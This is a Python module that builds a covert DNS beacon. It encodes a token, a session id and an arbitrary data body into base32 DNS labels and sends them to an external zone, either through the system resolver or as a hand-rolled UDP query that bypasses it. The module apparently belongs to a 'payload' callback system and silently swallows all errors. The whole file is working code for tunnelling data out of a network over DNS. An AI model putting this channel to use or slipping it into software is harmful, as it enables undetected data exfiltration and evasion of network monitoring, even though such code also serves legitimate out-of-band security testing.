import base64 as _b64
import os as _os
import socket as _socket
import struct as _struct


def _dns_header(token: bytes, session_id: bytes, seq_no: int, ev: int, flags: int) -> bytes:
    """[ev:4|flags:4](1B) ‖ instance_token(8B) ‖ session_id(8B) ‖ seq_no(2B) = 19B."""
    return bytes([(ev << 4) | (flags & 0x0F)]) + token + session_id + _struct.pack(">H", seq_no)


def _dns_query_packet(qname: str) -> bytes:
    """A minimal, hand-rolled DNS A-query packet — stdlib only, no third-party DNS library."""
    labels = qname.rstrip(".").split(".")
    qname_wire = b"".join(bytes([len(label)]) + label.encode("ascii") for label in labels) + b"\x00"
    return (
        _os.urandom(2)                        # transaction id
        + b"\x01\x00"                          # flags: standard query, recursion desired
        + _struct.pack(">HHHH", 1, 0, 0, 0)    # qdcount=1, an/ns/ar=0
        + qname_wire
        + _struct.pack(">HH", 1, 1)            # QTYPE=A, QCLASS=IN
    )


def send_dns(token: str, zone: str, body: bytes = b"", server: str = "") -> None:
    """Send a tier-0 DNS beacon: base32(header ‖ body).<zone> (DNS projection, modes 1-2).

    header = [ev|flags](1B) ‖ instance_token(8B) ‖ session_id(8B, random) ‖ seq_no(2B, =0) — the
    19B mandatory header the edge's receiver_dns.go requires. body rides the free budget (20B on
    a single label); longer bodies spill across additional ≤63-char labels (mode 2) — still one
    round-trip, no reassembly.

    token: hex instance_token (16 hex chars / 8 bytes), injected at build time as `_TOKEN`.
    server: optional "host:port" to query directly via a hand-rolled UDP packet, bypassing the
    OS resolver. Needed whenever the zone isn't really delegated to the edge (e.g. local
    testing against a dev edge on a non-53 port) — omit it for real deployments, where the OS
    resolver recurses to the edge through ordinary public DNS delegation.
    Swallows all errors — a payload must never crash on a failed callback.
    """
    try:
        tok = bytes.fromhex(token)
        session_id = _os.urandom(8)
        packed = _dns_header(tok, session_id, 0, 1, 0) + body
        # The edge base32-decodes each label INDEPENDENTLY and concatenates the raw bytes
        # (receiver_dns.go's parseDNS) — so each label must be a self-contained encoding of its
        # own byte range. Chunk the RAW bytes at 39B (the largest chunk whose base32 form is
        # still ≤63 chars: ceil(39*8/5) = 63) *before* encoding, one b32encode call per chunk;
        # slicing one continuous encoded string at 63 chars would split mid base32-group (63
        # isn't a multiple of 8) and corrupt every label after the first.
        labels = [
            _b64.b32encode(packed[i:i + 39]).rstrip(b"=").decode().lower()
            for i in range(0, len(packed), 39)
        ]
        qname = ".".join(labels) + "." + zone.rstrip(".")
        if server:
            host, _, port = server.partition(":")
            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            try:
                sock.sendto(_dns_query_packet(qname), (host, int(port) if port else 53))
            finally:
                sock.close()
        else:
            _socket.getaddrinfo(qname, None)
    except Exception:
        pass
